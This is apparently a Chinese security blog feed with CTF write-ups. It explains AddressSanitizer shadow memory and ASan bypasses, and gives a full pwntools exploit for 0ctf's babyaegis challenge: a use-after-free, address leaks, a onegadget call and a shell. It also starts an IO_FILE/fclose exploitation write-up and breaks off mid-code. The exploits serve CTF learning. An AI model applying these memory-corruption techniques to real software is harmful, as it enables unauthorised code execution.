class="headerlink" title="内存映射"></a>内存映射</h3><p>AddressSanitizer保护的主要原理是对程序中的虚拟内存提供粗粒度的影子内存(没8个字节的内存对应一个字节的影子内存)，为了减少overhead，就采用了直接内存映射策略，所采用的具体策略如下：Shadow=(Mem &gt;&gt; 3) + offset。每8个字节的内存对应一个字节的影子内存，影子内存中每个字节存取一个数字k,如果k=0，则表示该影子内存对应的8个字节的内存都能访问。<br>如果k在0到7之间,表示前k个字节可以访问，如果k为负数，不同的数字表示不同的错误（e.g. Stack buffer overflow, Heap buffer overflow)。具体的映射策略如下图所示。</p><h4 id="64位"><a href="#64位" class="headerlink" title="64位"></a>64位</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Shadow &#x3D; (Mem &gt;&gt; 3) + 0x7fff8000;</span><br></pre></td></tr></table></figure><table><thead><tr><th>[0x10007fff8000, 0x7fffffffffff]</th><th>HighMem</th></tr></thead><tbody><tr><td>[0x02008fff7000, 0x10007fff7fff]</td><td>HighShadow</td></tr><tr><td>[0x00008fff7000, 0x02008fff6fff]</td><td>ShadowGap</td></tr><tr><td>[0x00007fff8000, 0x00008fff6fff]</td><td>LowShadow</td></tr><tr><td>[0x000000000000, 0x00007fff7fff]</td><td>LowMem</td></tr></tbody></table><h4 id="32位"><a href="#32位" class="headerlink" title="32位"></a>32位</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Shadow &#x3D; (Mem &gt;&gt; 3) + 0x20000000;</span><br></pre></td></tr></table></figure><table><thead><tr><th>[0x40000000, 0xffffffff]</th><th>HighMem</th></tr></thead><tbody><tr><td>[0x28000000, 0x3fffffff]</td><td>HighShadow</td></tr><tr><td>[0x24000000, 0x27ffffff]</td><td>ShadowGap</td></tr><tr><td>[0x20000000, 0x23ffffff]</td><td>LowShadow</td></tr><tr><td>[0x00000000, 0x1fffffff]</td><td>LowMem</td></tr></tbody></table><h1 id="Bypassing-AddressSanitizer"><a href="#Bypassing-AddressSanitizer" class="headerlink" title="Bypassing AddressSanitizer"></a>Bypassing AddressSanitizer</h1><p>显而易见的是，ASan 的检查很大一部分是基于影子内存中，此时影子内存的flag值。假设如果全段影子内存的 flag 全为0，我们就可以完全无视掉ASan，而0ctf 的 babyaegis，正是给了一个写0的机会，给了我们一次对一个指针再次读写的机会。</p><p>此外还有几种方法，比如</p><h3 id="Adjacent-Buffers-in-the-Same-Struct-Class"><a href="#Adjacent-Buffers-in-the-Same-Struct-Class" class="headerlink" title="Adjacent Buffers in the Same Struct/Class"></a>Adjacent Buffers in the Same Struct/Class</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">$ cat test1.c</span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span>&#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">Test()&#123;</span><br><span class="line"> command[<span class="number">0</span>] = <span class="string">&#x27;l&#x27;</span>;</span><br><span class="line"> command[<span class="number">1</span>] = <span class="string">&#x27;s&#x27;</span>;</span><br><span class="line"> command[<span class="number">2</span>] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">a</span><span class="params">()</span></span>&#123;</span><br><span class="line"> <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, buffer);</span><br><span class="line"> system(command);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line"><span class="keyword">char</span> buffer[<span class="number">10</span>];</span><br><span class="line"><span class="keyword">char</span> command[<span class="number">10</span>];</span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"> Test aTest = Test();</span><br><span class="line"> aTest.a();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># swing @ localhost in /tmp [1:42:48]</span></span><br><span class="line">$ g++ -O -g -fsanitize=address test1.c</span><br><span class="line">clang: warning: treating <span class="string">&#x27;c&#x27;</span> input as <span class="string">&#x27;c++&#x27;</span> when <span class="keyword">in</span> C++ mode, this behavior is deprecated [-Wdeprecated]</span><br><span class="line"></span><br><span class="line"><span class="comment"># swing @ localhost in /tmp [1:43:10]</span></span><br><span class="line">$ ./a.out</span><br><span class="line">aaaaaaaaaa/bin/sh;</span><br><span class="line">sh-3.2$ id</span><br><span class="line">uid=501(swing) gid=20(staff) groups=20(staff),701(com.apple.sharepoint.group.1),12(everyone),61(localaccounts),79(_appserverusr),80(admin),81(_appserveradm),98(_lpadmin),501(access_bpf),33(_appstore),100(_lpoperator),204(_developer),250(_analyticsusers),395(com.apple.access_ftp),398(com.apple.access_screensharing),399(com.apple.access_ssh-disabled)</span><br><span class="line">sh-3.2$</span><br></pre></td></tr></table></figure><p>剩下见 PDF：</p><div class="row">    <embed src="https://dl.packetstormsecurity.net/papers/general/BreakingAddressSanitizer.pdf" width="100%" height="550" type="application/pdf"></div><h1 id="0ctf-babyaegis"><a href="#0ctf-babyaegis" class="headerlink" title="0ctf babyaegis"></a>0ctf babyaegis</h1><h2 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">root@linuxkit-025000000001 /pwn<span class="comment"># checksec aegis</span></span><br><span class="line">[*] <span class="string">&#x27;/pwn/aegis&#x27;</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br><span class="line">    FORTIFY:  Enabled</span><br><span class="line">    ASAN:     Enabled</span><br><span class="line">    UBSAN:    Enabled   </span><br></pre></td></tr></table></figure><p>   开了 ASan </p><p>  影子内存位置： mem &gt;&gt; 3) + 0x7FFF8000LL</p><h3 id="漏洞点"><a href="#漏洞点" class="headerlink" title="漏洞点"></a>漏洞点</h3><p>在update中：</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/blog-img/20190409023314.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/blog-img/20190409023314.png"></a></p><p>在delete中</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/blog-img/20190409023349.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/blog-img/20190409023349.png"></a></p><p>存在uaf</p><p>此外，存在一个后门函数为：secret函数</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/blog-img/20190409023617.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/blog-img/20190409023617.png"></a></p><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>可以先置checker为0使得我们可以进行一个堆溢出改size值为0，接下来在做一次更改，这次可以溢出更多，改size为更大的值。然后rm了这个堆块再malloc出来就可以造成一个uaf的效果。接着利用uaf的指针泄漏各种program base 和libc base什么的东西。然后利用指针去改写bss段上的值导致__sanitizer::Die()函数内部call rax 调用我们想调用的函数。这里本来是想调用onegadget，但是不明确也没深究为什么onegadget没起作用。之后此处改写为gets控制程序流然后构成栈溢出覆盖ret为onegadget接着就getshell了</p><h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">debug=<span class="number">1</span></span><br><span class="line"><span class="comment"># context.log_level = &#x27;debug&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;notiterm&#x27;</span>, <span class="string">&#x27;-t&#x27;</span>, <span class="string">&#x27;iterm&#x27;</span>,<span class="string">&#x27;-e&#x27;</span>]</span><br><span class="line"><span class="comment"># context.terminal = [&#x27;notiterm&#x27;, &#x27;-t&#x27;, &#x27;iterm&#x27;, &#x27;-p&#x27;, &#x27;15112&#x27;, &#x27;-e&#x27;] # use 50806 port as an example</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    p = process(<span class="string">&#x27;./aegis&#x27;</span>)</span><br><span class="line">    <span class="comment"># p=process(&#x27;./aegis&#x27;,env=&#123;&#x27;LD_PRELOAD&#x27;:&#x27;./libc-2.27.so&#x27;&#125;)</span></span><br><span class="line">    <span class="comment"># gdb.attach(p)</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p=remote(<span class="string">&#x27;111.186.63.209&#x27;</span>,<span class="number">6666</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get</span>(<span class="params">x</span>):</span></span><br><span class="line">    <span class="keyword">return</span> p.recvuntil(x)</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pu</span>(<span class="params">x</span>):</span></span><br><span class="line">    p.send(x)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pu_enter</span>(<span class="params">x</span>):</span></span><br><span class="line">    p.sendline(x)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">sz,content,id</span>):</span></span><br><span class="line">    pu_enter(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    get(<span class="string">&#x27;Size&#x27;</span>)</span><br><span class="line">    pu_enter(str(sz))</span><br><span class="line">    get(<span class="string">&#x27;Content&#x27;</span>)</span><br><span class="line">    pu(content)</span><br><span class="line">    get(<span class="string">&#x27;ID&#x27;</span>)</span><br><span class="line">    pu_enter(str(id))</span><br><span class="line">    get(<span class="string">&#x27;Choice: &#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">idx</span>):</span></span><br><span class="line">    pu_enter(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    get(<span class="string">&#x27;Index&#x27;</span>)</span><br><span class="line">    pu_enter(str(idx))</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">update</span>(<span class="params">idx,content,id</span>):</span></span><br><span class="line">    pu_enter(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    get(<span class="string">&#x27;Index&#x27;</span>)</span><br><span class="line">    pu_enter(str(idx))</span><br><span class="line">    get(<span class="string">&#x27;Content: &#x27;</span>)</span><br><span class="line">    pu(content)</span><br><span class="line">    get(<span class="string">&#x27;New ID:&#x27;</span>)</span><br><span class="line">    pu_enter(str(id))</span><br><span class="line">    get(<span class="string">&#x27;Choice:&#x27;</span> )</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params">idx</span>):</span></span><br><span class="line">    pu_enter(<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">    get(<span class="string">&#x27;Index&#x27;</span>)</span><br><span class="line">    pu_enter(str(idx))</span><br><span class="line">    get(<span class="string">&#x27;Choice:&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">secret</span>(<span class="params">addr</span>):</span></span><br><span class="line">    pu_enter(<span class="string">&#x27;666&#x27;</span>)</span><br><span class="line">    get(<span class="string">&#x27;Lucky Number: &#x27;</span>)</span><br><span class="line">    pu_enter(str(addr))</span><br><span class="line">    get(<span class="string">&#x27;Choice:&#x27;</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">8</span>,<span class="number">0x123456789abcdef</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">4</span>):</span><br><span class="line">    add(<span class="number">0x10</span>,<span class="string">&#x27;b&#x27;</span>*<span class="number">0x8</span>,<span class="number">123</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#0x602000000000</span></span><br><span class="line"><span class="comment">#0x7fff8000</span></span><br><span class="line">secret(<span class="number">0xc047fff8008</span><span class="number">-4</span>)</span><br><span class="line">update(<span class="number">0</span>,<span class="string">&#x27;\x02&#x27;</span>*<span class="number">0x12</span>,<span class="number">0x123456789</span>)</span><br><span class="line">update(<span class="number">0</span>,<span class="string">&#x27;\x02&#x27;</span>*<span class="number">0x10</span>+p64(<span class="number">0x02ffffff00000002</span>)[:<span class="number">7</span>],<span class="number">0x01f000ff1002ff</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line"><span class="comment">#raw_input(&quot;#&quot;)</span></span><br><span class="line">add(<span class="number">0x10</span>,p64(<span class="number">0x602000000018</span>),<span class="number">0</span>)</span><br><span class="line"><span class="comment">#raw_input(&quot;#&quot;)</span></span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">get(<span class="string">&#x27;Content: &#x27;</span>)</span><br><span class="line">addr = u64(get(<span class="string">&#x27;\n&#x27;</span>)[:<span class="number">-1</span>]+<span class="string">&#x27;\x00\x00&#x27;</span>)</span><br><span class="line"><span class="keyword">print</span> addr</span><br><span class="line">pbase = addr <span class="number">-0x114AB0</span></span><br><span class="line">get(<span class="string">&#x27;Choice: &#x27;</span>)</span><br><span class="line"></span><br><span class="line">update(<span class="number">5</span>,p64(pbase+<span class="number">0x347DF0</span>)[:<span class="number">2</span>],(pbase+<span class="number">0x347DF0</span>)&gt;&gt;<span class="number">8</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">get(<span class="string">&#x27;Content: &#x27;</span>)</span><br><span class="line">addr = u64(get(<span class="string">&#x27;\n&#x27;</span>)[:<span class="number">-1</span>]+<span class="string">&#x27;\x00\x00&#x27;</span>)</span><br><span class="line">base = addr <span class="number">-0xE4FA0</span></span><br><span class="line">get(<span class="string">&#x27;Choice: &#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">update(<span class="number">5</span>,p64(pbase+<span class="number">0x0FB08A0</span>),p64(pbase+<span class="number">0x7AE140</span>))</span><br><span class="line"><span class="comment">#update(5,p64(pbase+0xfb08a0+0x28),(pbase+0xfb08a0+0x28)&gt;&gt;8)</span></span><br><span class="line">raw_input(<span class="string">&quot;aa&quot;</span>)</span><br><span class="line">pu_enter(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">get(<span class="string">&#x27;Index&#x27;</span>)</span><br><span class="line">pu_enter(<span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">get(<span class="string">&#x27;Content&#x27;</span>)</span><br><span class="line"><span class="comment">#raw_input(hex(pbase+0x7AE140))</span></span><br><span class="line">pu(p64(base+<span class="number">524464</span>)[:<span class="number">7</span>])</span><br><span class="line"><span class="comment">#get(&#x27;ID&#x27;)</span></span><br><span class="line">raw_input(<span class="string">&quot;#get&quot;</span>+str(hex(pbase+<span class="number">0x7AE140</span>)))</span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">471</span>+p64(base+<span class="number">0x4f322</span>)+<span class="string">&#x27;\x00&#x27;</span>*<span class="number">0x100</span></span><br><span class="line"><span class="comment">#raw_input(hex(base + 0x4f322))</span></span><br><span class="line">pu_enter(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#print(hex(lbase))</span></span><br><span class="line"><span class="comment">#print(hex(stack))</span></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a href="https://github.com/google/sanitizers/wiki/AddressSanitizerAlgorithm">github-AddressSanitizer</a></p><p><a href="https://www.usenix.org/system/files/conference/atc12/atc12-final39.pdf">AddressSanitizer: A Fast Address Sanity Checker</a></p><p><a href="https://blog.csdn.net/pang241/article/details/76137969">AddressSanitizer算法及源码解析</a></p><p><a href="https://blog.csdn.net/pang241/article/details/76137969">Bypassing AddressSanitizer</a></p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> Other </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Asan </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>IO_FILE Pwn 利用整理</title>
      <link href="IO_FILE_Pwn.html"/>
      <url>IO_FILE_Pwn.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<h2 id="0x01-seethefile"><a href="#0x01-seethefile" class="headerlink" title="0x01 seethefile"></a>0x01 seethefile</h2><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>程序主要有以下功能：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">switch</span> ( atoi(&amp;nptr) )</span><br><span class="line"> &#123;</span><br><span class="line">   <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">     openfile();</span><br><span class="line">     <span class="keyword">break</span>;</span><br><span class="line">   <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">     readfile();</span><br><span class="line">     <span class="keyword">break</span>;</span><br><span class="line">   <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">     writefile();</span><br><span class="line">     <span class="keyword">break</span>;</span><br><span class="line">   <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">     closefile();</span><br><span class="line">     <span class="keyword">break</span>;</span><br><span class="line">   <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">     <span class="built_in">printf</span>(<span class="string">&quot;Leave your name :&quot;</span>);</span><br><span class="line">     __isoc99_scanf(<span class="string">&quot;%s&quot;</span>, &amp;name);</span><br><span class="line">     <span class="built_in">printf</span>(<span class="string">&quot;Thank you %s ,see you next time\n&quot;</span>, &amp;name);</span><br><span class="line">     <span class="keyword">if</span> ( fp )</span><br><span class="line">       fclose(fp);</span><br><span class="line">     <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">     <span class="keyword">return</span>;</span><br></pre></td></tr></table></figure><p>功能如其名，就不复述了，一些功能做了一点check。漏洞主要是两个</p><ul><li>nptr 栈溢出</li></ul><p>​    <code>__isoc99_scanf(&quot;%s&quot;, &amp;nptr);</code> 溢出发生在栈上</p><ul><li>name 溢出</li></ul><p>​       <code>·__isoc99_scanf(&quot;%s&quot;, &amp;name);            // overflow in bss</code></p><p>通过 checksec ，我们发现有canary ，栈溢出需要 bypass canary才能利用</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[*] <span class="string">&#x27;/pwn/seethefile&#x27;</span></span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure><h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><p>当我们咋输入name的时候输入一段长的字符串的时候，在 fclose 会发生报错</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">Program received signal SIGSEGV, Segmentation fault.</span><br><span class="line">[----------------------------------registers-----------------------------------]</span><br><span class="line">EAX: 0x61616161 (<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line">EBX: 0xf7fc9000 --&gt; 0x1b1db0</span><br><span class="line">ECX: 0xffffffff</span><br><span class="line">EDX: 0xf7fca870 --&gt; 0x0</span><br><span class="line">ESI: 0x61616161 (<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line">EDI: 0xf7fc9000 --&gt; 0x1b1db0</span><br><span class="line">EBP: 0xffffd6b8 --&gt; 0xffffd708 --&gt; 0x0</span><br><span class="line">ESP: 0xffffd690 --&gt; 0xf7fe77eb (&lt;_dl_fixup+11&gt;:add    esi,0x15815)</span><br><span class="line">EIP: 0xf7e749f7 (&lt;_IO_new_fclose+23&gt;:cmp    BYTE PTR [esi+0x46],0x0)</span><br><span class="line">EFLAGS: 0x10286 (carry PARITY adjust zero SIGN <span class="built_in">trap</span> INTERRUPT direction overflow)</span><br><span class="line">[-------------------------------------code-------------------------------------]</span><br><span class="line">   0xf7e749eb &lt;_IO_new_fclose+11&gt;:add    ebx,0x154615</span><br><span class="line">   0xf7e749f1 &lt;_IO_new_fclose+17&gt;:sub    esp,0x1c</span><br><span class="line">   0xf7e749f4 &lt;_IO_new_fclose+20&gt;:mov    esi,DWORD PTR [ebp+0x8]</span><br><span class="line">=&gt; 0xf7e749f7 &lt;_IO_new_fclose+23&gt;:cmp    BYTE PTR [esi+0x46],0x0</span><br><span class="line">   0xf7e749fb &lt;_IO_new_fclose+27&gt;:jne    0xf7e74ba0 &lt;_IO_new_fclose+448&gt;</span><br><span class="line">   0xf7e74a01 &lt;_IO_new_fclose+33&gt;:mov    eax,DWORD PTR [esi]</span><br><span class="line">   0xf7e74a03 &lt;_IO_new_fclose+35&gt;:<span class="built_in">test</span>   ah,0x20</span><br><span class="line">   0xf7e74a06 &lt;_IO_new_fclose+38&gt;:jne    0xf7e74b80 &lt;_IO_new_fclose+416&gt;</span><br><span class="line">[------------------------------------stack-------------------------------------]</span><br><span class="line">0000| 0xffffd690 --&gt; 0xf7fe77eb (&lt;_dl_fixup+11&gt;:add    esi,0x15815)</span><br><span class="line">0004| 0xffffd694 --&gt; 0x0</span><br><span class="line">0008| 0xffffd698 --&gt; 0xf7fc9000 --&gt; 0x1b1db0</span><br><span class="line">0012| 0xffffd69c --&gt; 0xf7fc9000 --&gt; 0x1b1db0</span><br><span class="line">0016| 0xffffd6a0 --&gt; 0xffffd708 --&gt; 0x0</span><br><span class="line">0020| 0xffffd6a4 --&gt; 0xf7fee010 (&lt;_dl_runtime_resolve+16&gt;:pop    edx)</span><br><span class="line">0024| 0xffffd6a8 --&gt; 0xf7e749eb (&lt;_IO_new_fclose+11&gt;:add    ebx,0x154615)</span><br><span class="line">0028| 0xffffd6ac --&gt; 0x0</span><br><span class="line">[------------------------------------------------------------------------------]</span><br><span class="line">Legend: code, data, rodata, value</span><br><span class="line">Stopped reason: SIGSEGV</span><br><span class="line">_IO_new_fclose (fp=0x61616161) at iofclose.c:48</span><br><span class="line">48iofclose.c: No such file or directory.</span><br></pre></td></tr></table></figure><p>我们会发现 fp 指针被覆盖成了_IO_new_fclose —&gt; fp =  0x61616161</p><p>回顾下 fclose的知识点：</p><p>功能：关闭一个文件流，使用 fclose 就可以把缓冲区内最后剩余的数据输出到磁盘文件中，并释放文件指针和有关的缓冲区</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span></span><br><span class="line">_IO_new_fclose (FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">int</span> status;</span><br><span class="line">  CHECK_FILE(fp, EOF);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> SHLIB_COMPAT (libc, GLIBC_2_0, GLIBC_2_1)</span></span><br><span class="line">  <span class="comment">/* We desperately try to help programs which are using streams in a</span></span><br><span class="line"><span class="comment">     strange way and mix old and new 